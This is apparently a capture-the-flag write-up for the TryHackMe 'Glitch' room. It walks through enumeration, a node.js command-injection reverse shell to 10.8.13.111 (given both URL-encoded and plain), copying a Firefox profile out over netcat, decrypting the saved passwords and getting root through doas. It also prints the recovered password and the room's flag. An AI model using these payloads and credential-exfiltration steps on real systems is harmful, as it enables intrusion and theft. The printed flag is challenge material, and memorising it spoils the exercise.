# [Challenge](https://tryhackme.com/room/glitch)
# ENUM
## nmap (`nmap -A -p- -T4 --min-rate 5000 glitch`)
```nmap
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: not allowed
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## gobuster (`gobuster dir -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u http://glitch -t 100`)
```gobuster
/img                  (Status: 301) [Size: 173] [--> /img/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/secret               (Status: 200) [Size: 724]
```
# EXPLOITATION
There's an API call: `/api/access`: `{"token":"dGhpc19pc19ub3RfcmVhbA=="}` -- (base64) --> `this_is_not_real`; there's also a cookie: let's try setting as value `this_is_not_real`: the page changed! 
Hint 1: "What other methods does the API accept?"
Let's open Burp and try using the POST method: `{"message":"there_is_a_glitch_in_the_matrix"}`
Let's go in `/secret` with the new cookie and... it's useless.
Let's use `ffuf`: `ffuf -u "http://glitch/api/items?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -X POST -mc all -fc 400,404`
There's `cmd`! Let's [reverse shell](https://www.revshells.com/) (`node.js`): `require%28%27child_process%27%29.exec%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.8.13.111%204444%20%3E%2Ftmp%2Ff%27%29` (URL encoded payload, the normal one is `require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.13.111 4444 >/tmp/f')`)

# PRIVILEGE ESCALATION
We can see that `doas` has SUID bit check! Let's check the `doas.conf`: `permit v0id as root`
We need to be `v0id` user... let's find something else.
There's the firefox hidden directory in `~/user` folder: there could be some passwords saved in the browser! Let's copy the `./firefox` folder: `nc 10.8.13.111 5555 < firefox.tgz` and on our machine: `nc -lvnp 5555 > firefox.tgz` --> `tar -xf firefox.tgz` -> `firefox .firefox` -- (now let's [decrypt the files](http://github.com/unode/firefox_decrypt)) --> `git clone https://github.com/unode/firefox_decrypt.git` -> `python3 firefox_decrypt/firefox_decrypt.py ./firefox/.firefox/b5w4643p.default-release`
```
Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```
Perfect! Now let's log into v0id (using an interactive terminal `python3 -c 'import pty; pty.spawn("/bin/bash")'`)
Now, let's execute `doas -u root /bin/bash`: we're ROOT! Let's grab the flag: `THM{diamonds_break_our_aching_minds}`



